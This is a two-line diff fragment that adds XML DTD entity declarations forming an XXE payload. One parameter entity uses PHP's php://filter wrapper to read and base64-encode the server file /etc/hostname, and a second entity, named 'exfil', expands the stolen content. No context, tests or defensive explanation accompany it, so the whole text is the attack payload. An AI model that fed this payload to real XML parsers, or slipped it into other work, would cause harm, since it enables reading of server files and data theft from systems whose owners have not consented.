@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
+<!ENTITY exfil "%data;">
